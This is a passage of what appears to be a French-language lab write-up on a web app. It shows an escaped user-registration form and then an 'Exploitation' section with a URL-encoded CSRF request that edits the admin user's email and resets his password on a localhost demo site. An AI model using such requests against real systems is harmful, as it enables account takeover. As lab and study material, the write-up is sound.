                            &lt;li class=&quot;c-menu-type-classic&quot;&gt;&lt;a href=&quot;/articles&quot; class=&quot;c-link&quot; title=&quot;All offers&quot;&gt;All offers&lt;/a&gt;&lt;/li&gt;


                            &lt;li class=&quot;c-menu-type-classic&quot;&gt;&lt;a href=&quot;/users/login&quot;&gt;&lt;button type=&quot;button&quot; class=&quot;btn c-btn c-theme-btn c-btn-uppercase c-btn-bold&quot;&gt; Sign in &lt;/button&gt;&lt;/a&gt;&lt;/li&gt;
                            &lt;li class=&quot;c-menu-type-classic&quot;&gt;&lt;a href=&quot;/users/add&quot;&gt;&lt;button type=&quot;button&quot; class=&quot;btn c-btn c-theme-btn c-btn-uppercase c-btn-bold&quot;&gt; Not registered yet? &lt;/button&gt;&lt;/a&gt;&lt;/li&gt;
                                            &lt;/ul&gt;
                &lt;/nav&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/header&gt;



&lt;div class=&quot;jumbotron&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;h1&gt;Add user&lt;/h1&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div class=&quot;container&quot;&gt;


    &lt;div class=&quot;users form large-9 medium-8 columns content&quot;&gt;
        &lt;form method=&quot;post&quot; accept-charset=&quot;utf-8&quot; id=&quot;adduser&quot; class=&quot;form-horizontal&quot; role=&quot;form&quot; action=&quot;/users/add&quot;&gt;&lt;div style=&quot;display:none;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;POST&quot;/&gt;&lt;input type=&quot;hidden&quot; name=&quot;_csrfToken&quot; autocomplete=&quot;off&quot; value=&quot;278c6ae0b90f6fc672fed6d7bc9f5d3f3d4e4f798f243e5ba46aaca262b43c283100fb755c47f6900f626ed1a70b5d950a3073f160954561982dab7b3eb7dc6b&quot;/&gt;&lt;/div&gt;        &lt;fieldset&gt;
            &lt;div class=&quot;form-group email required&quot;&gt;&lt;label class=&quot;control-label&quot; for=&quot;emailadd&quot;&gt;Email (mandatory)&lt;/label&gt;&lt;input type=&quot;email&quot; name=&quot;email&quot; id=&quot;emailadd&quot; required=&quot;required&quot; maxlength=&quot;255&quot; class=&quot;form-control&quot;/&gt;&lt;/div&gt;&lt;div class=&quot;form-group text&quot;&gt;&lt;label class=&quot;control-label&quot; for=&quot;addressadd&quot;&gt;Address&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;address&quot; id=&quot;addressadd&quot; maxlength=&quot;255&quot; class=&quot;form-control&quot;/&gt;&lt;/div&gt;&lt;div class=&quot;form-group text&quot;&gt;&lt;label class=&quot;control-label&quot; for=&quot;zipcodeadd&quot;&gt;Zipcode&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;zipcode&quot; id=&quot;zipcodeadd&quot; maxlength=&quot;8&quot; class=&quot;form-control&quot;/&gt;&lt;/div&gt;&lt;div class=&quot;form-group text&quot;&gt;&lt;label class=&quot;control-label&quot; for=&quot;cityadd&quot;&gt;City&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;city&quot; id=&quot;cityadd&quot; maxlength=&quot;50&quot; class=&quot;form-control&quot;/&gt;&lt;/div&gt;&lt;div class=&quot;form-group tel&quot;&gt;&lt;label class=&quot;control-label&quot; for=&quot;phoneadd&quot;&gt;Phone&lt;/label&gt;&lt;input type=&quot;tel&quot; name=&quot;phone&quot; id=&quot;phoneadd&quot; maxlength=&quot;12&quot; class=&quot;form-control&quot;/&gt;&lt;/div&gt;&lt;div class=&quot;form-group text&quot;&gt;&lt;label class=&quot;control-label&quot; for=&quot;agentnumberadd&quot;&gt;Agent Number&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;agent_number&quot; id=&quot;agentnumberadd&quot; maxlength=&quot;5&quot; class=&quot;form-control&quot;/&gt;&lt;/div&gt;            &lt;hr&gt;
            &lt;div class=&quot;form-group password required&quot;&gt;&lt;label class=&quot;control-label&quot; for=&quot;passwordadd&quot;&gt;Password (mandatory)&lt;/label&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;passwordadd&quot; required=&quot;required&quot; class=&quot;form-control&quot;/&gt;&lt;/div&gt;            &lt;div class=&quot;form-group password2&quot;&gt;
                &lt;label class=&quot;control-label&quot; for=&quot;passwordadd2&quot;&gt;Confirm Password (mandatory)&lt;/label&gt;
                &lt;input type=&quot;password&quot; id=&quot;passwordadd2&quot; required=&quot;required&quot; class=&quot;form-control&quot;&gt;
            &lt;/div&gt;
            &lt;button id=&quot;createbutton&quot; disabled=&quot;disabled&quot; class=&quot;c-action-btn btn btn-md c-btn-square c-btn-border-2x c-btn-black c-btn-bold c-btn-uppercase btn-default&quot; type=&quot;submit&quot;&gt;Create&lt;/button&gt;        &lt;/fieldset&gt;
        &lt;/form&gt;    &lt;/div&gt;

&lt;/div&gt;
&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
&lt;script&gt;
    function checkpass() {
        if($('#passwordadd').val() != '' &amp;&amp; $('#passwordadd').val() == $('#passwordadd2').val()) { $('#createbutton').removeAttr('disabled'); } else { $('#createbutton').prop('disabled', true);  }
    }
    $('#passwordadd').on('keyup paste',function(){ checkpass(); });
    $('#passwordadd2').on('keyup paste',function(){ checkpass(); });
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;!-- Served by: 172.19.0.2 --&gt;
¦'{]·ã»ó
</code></pre>

<h2 id="exploitation">Exploitation</h2>
<p>ESSAI DE PAWNER LE CSRF TOKEN DE JOE ADMIN ! 
A LA FIN DE L'URL</p>
<p>https%3A%2F%2Flocalhost%2Fusers%2Fedit%2F1%3Femail=joe%40neodemo.corp&amp;avatar_url=&amp;address=ananas+au+fond+de+la+mer&amp;zipcode=12345&amp;city=mediteran%C3%A9e&amp;phone=123456789&amp;agent_number=1&amp;password=banane</p>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
      
        <a href="../XSS%20stored/" class="btn btn-neutral" title="XSS stored"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
      
        </div>
      </div>

    </section>

  </div>

  <div class="rst-versions" role="note" aria-label="versions">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
      
        <span><a href="../XSS%20stored/" style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
    </span>
</div>
    <script>var base_url = '../..';</script>
    <script src="../../js/theme.js" defer></script>
      <script src="../../search/main.js" defer></script>
    <script defer>
        window.onload = function () {
            SphinxRtdTheme.Navigation.enable(true);
        };
    </script>

</body>
</html>
